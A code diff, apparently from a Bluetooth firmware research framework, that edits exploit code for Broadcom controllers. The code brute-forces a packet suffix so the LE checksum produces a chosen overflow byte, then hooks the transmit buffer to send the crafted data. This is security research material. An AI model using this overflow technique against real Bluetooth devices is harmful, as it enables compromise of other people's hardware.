@@ -1,3 +1,5 @@
+#include <string.h>
+
 #include <frankenstein/BCMBT/patching/patchram.h>
 #include <frankenstein/BCMBT/patching/hciio.h>
 #include <frankenstein/hook.h>
@@ -76,17 +78,19 @@ uint32_t adapt_crc(uint32_t hdr) {
     crc = *(uint32_t *)0x318ba4; //wib_conn_lfsr
     crc = ((crc>>16) & 0x0000ff) | (crc & 0x00ff00) | ((crc<<16) & 0xff0000);
 
-    btLeCrc(&hdr, 2, &crc); //hdr
-    btLeCrc(writhe_what_32, 248, &crc); //packet prefix
+    btLeCrc((uint8_t *)&hdr, 2, (uint8_t*)&crc);                //Compute chekcsum over header
+    btLeCrc((uint8_t *)writhe_what_32, 248, (uint8_t *)&crc);   //Update checksum over first
+                                                                //248 bytes of packet data
 
-    writhe_what_32[63] = bloc_hdr;
-    //return;
+    writhe_what_32[63] = bloc_hdr;  //set our target overflow value
+    //find a matching packet suffix in order
+    //to overflow with a correct fourth byte
     while (1) {
         crc_test = crc;
-        btLeCrc(&writhe_what_32[62], 3+4, &crc_test); //packet suffix
-        if ((reverse_bit(crc_test & 0xff) & 0xff) == (bloc_hdr>>24) & 0xff) {
-            break;
-        }
+        btLeCrc((uint8_t *)(&writhe_what_32[62]), 3+4, (uint8_t *)&crc_test);   //compute CRC over
+                                                                                //packet suffix
+        //check the CRC and try next value
+        if ((reverse_bit(crc_test & 0xff) & 0xff) == (bloc_hdr>>24) & 0xff) break;
         writhe_what_32[62] ++;
     }
     return writhe_what_32[62];
@@ -102,7 +106,7 @@ void bcsulp_progTxBuffer_pre( struct saved_regs * regs , void * arg ){
 
 
 int clock_SystemTimeMicroseconds32_nolock();
-uint32_t bcsulp_progTxBuffer_post( uint32_t retval) {
+uint32_t bcsulp_progTxBuffer_post( uint32_t retval, void *_) {
     //if (overflowed) { *(( int *) 0x318b68 ) ^= 1 << (rand()%32); *(( int *) 0x318b68 ) ^= 1 << (rand()%32); return;}
     //*(( int *) 0x318b68 ) &= 0xffff0000 ; // wib_tx_pyld_info
     //*(( int *) 0x318b68 ) |= HDR;
@@ -209,8 +213,8 @@ uint32_t bcsulp_progTxBuffer_post( uint32_t retval) {
 
 void fill_tx_buffer_pre( struct saved_regs * regs , void * arg ) {
     uint32_t *writhe_what_32 = (uint32_t *)&write_what;
-    if(I > 32) {
-        regs->r1 = writhe_what_32;
+    if(I > 32) { //delay until some packet
+        regs->r1 = (uint32_t)writhe_what_32;
         regs->r2 = 0xff;
     }
 }
